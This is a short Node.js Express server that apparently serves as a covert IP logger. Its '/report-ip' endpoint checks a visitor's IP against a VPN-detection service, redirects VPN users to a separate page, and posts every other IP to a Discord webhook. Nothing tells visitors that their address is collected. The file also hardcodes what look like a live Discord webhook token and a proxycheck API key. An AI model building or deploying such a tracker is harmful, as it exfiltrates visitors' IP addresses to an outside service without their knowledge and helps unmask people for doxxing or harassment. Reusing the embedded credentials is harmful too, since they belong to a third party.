const http = require('http')
const path = require('path')
const axios = require('axios')
const fs = require('fs')
const express = require('express')

const app = express()
app.set('trust proxy', 1)
app.use(express.json())

const port = 3000

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1441910971583955096/lB5pL8eiU_UccEKYVt11qdh3Jp1HaG4kNlnPR87q1slqf3tdiXUIREIrVYsz7ZiW44gV'

// Add VPN check helper function
const isVPN = async (ip) => {
  try {
    const response = await axios.post(`https://proxycheck.io/v2/${ip}?key=cy8fut-53x49v-246765-2w74n3`, null, {
      headers: {
        'X-Key': 'cy8fut-53x49v-246765-2w74n3	', // Get your API key from proxycheck.io
        'Content-Type': 'application/json'
      }
    })
    return response.data.type === 'vpn'
  } catch (error) {
    console.error('Error checking VPN status:', error)
    return false
  }
}

app.post('/report-ip', async (req, res) => {
  try {
    const { ip } = req.body
    const isVpn = await isVPN(ip)
    
    if (isVpn) {
      res.status(301).redirect('/vpn')
      return
    }

    await axios.post(DISCORD_WEBHOOK_URL, {
      content: `Visitor IP: ${ip}`,
    })
    res.status(200).send('IP reported successfully')
  } catch (error) {
    console.error('Error sending IP to Discord:', error)
    res.status(500).send('Failed to report IP')
  }
})

app.get('/vpn', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'vpn.html')
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.status(500).send('Error loading vpn.html')
      return
    }
    res.writeHead(200, { 'Content-Type': 'text/html' })
    res.end(data)
  })
})

app.get('/', (req, res) => {
  const filePath = path.join(__dirname, 'public', 'index.html')
  fs.readFile(filePath, (err, data) => {
    if (err) {
      res.status(500).send('Error loading index.html')
      return
    }
    res.writeHead(200, { 'Content-Type': 'text/html' })
    res.end(data)
  })
})

app.listen(port, () => {
  console.log(`Server listening on port http://localhost:${port}`)
})
